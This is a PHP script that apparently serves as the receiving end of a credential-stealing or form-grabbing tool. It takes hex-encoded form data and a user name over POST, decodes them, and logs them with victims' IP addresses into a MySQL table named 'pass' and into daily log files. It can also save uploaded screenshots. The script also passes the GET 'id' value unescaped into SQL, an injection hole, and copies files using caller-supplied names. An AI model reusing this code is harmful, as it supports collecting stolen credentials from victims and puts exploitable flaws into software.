<?php

$filename="logs/a311form" ;

$id=$_GET['id'];
if($info==""):
$info=$_POST['info'];
$user=$_POST['user'];
endif;
if($pngname==""):
//$pngdata=$_REQUEST['pngdata'];
//$pngname=$_REQUEST['pngname'];
endif;

$info=decode_string($info);


$date=date("d.m.Y");
$tim=date("H:i:s");
$out=explode(":", $tim);
$out1=explode(".", $date);
$hours=$out[0]+8;
$days=$out1[0];
if($out[0]==16): $hours=00;$days=$out1[0]+1;endif;
if($out[0]==17): $hours=01;$days=$out1[0]+1;endif;
if($out[0]==18): $hours=02;$days=$out1[0]+1;endif;
if($out[0]==19): $hours=03;$days=$out1[0]+1;endif;
if($out[0]==20): $hours=04;$days=$out1[0]+1;endif;
if($out[0]==21): $hours=05;$days=$out1[0]+1;endif;
if($out[0]==22): $hours=06;$days=$out1[0]+1;endif;
if($out[0]==23): $hours=07;$days=$out1[0]+1;endif;
if($days=="1"): $days="01";endif;
if($days=="2"): $days="02";endif;
if($days=="3"): $days="03";endif;
if($days=="4"): $days="04";endif;
if($days=="5"): $days="05";endif;
if($days=="6"): $days="06";endif;
if($days=="7"): $days="07";endif;
if($days=="8"): $days="08";endif;
if($days=="9"): $days="09";endif;
if($days=="32"): $days=01;endif;
$tim=$hours.":".$out[1].":".$out[2];
$date=$days.".".$out1[1].".".$out1[2];

$ip=getenv("REMOTE_ADDR");
$real_ip=getenv("HTTP_X_FORWARDED_FOR");

if($pngname!=""):
$pngname="logs/".$pngname.".png";
copy($pngdata,$pngname);
$info=$info."\r\n[ ".$pngname." ]";
endif;

include("mysqllog.php");
if($mysql_do==1):
if(@!mysql_connect($mysql_host,$mysql_login,$mysql_pass)) echo "<p class=err>Error. Can't connect to mysql server</p>";
if(@!mysql_select_db($mysql_db)) echo "<p class=err>Error. Can't connect to DB</p>";

mysql_query("INSERT INTO pass (add_date,id,uidlog,ip_real,ip,form) VALUES (now(),'".$id."','".$user."','".$real_ip."','".$ip."','".$info."')");
endif;
$filename=$filename.$days.".txt";
$fh=fopen($filename,"a+");
if($real_ip!=""):

fputs($fh,"\r\n$info\r\n$user\r\n[ID:$id IP_REAL:$real_ip IP:$ip $date $tim]\r\n");
else:
fputs($fh,"\r\n$info\r\n$user\r\n[ID:$id IP:$ip $date $tim]\r\n");
endif;
fclose($fh);
exit;
exit;



function decode_string($string) {
    $bindata = '';
    for ($i=0;$i<strlen($string);$i+=2) {
        $bindata.=chr(hexdec(substr($string,$i,2)));
    }
    return addslashes($bindata);
}

?>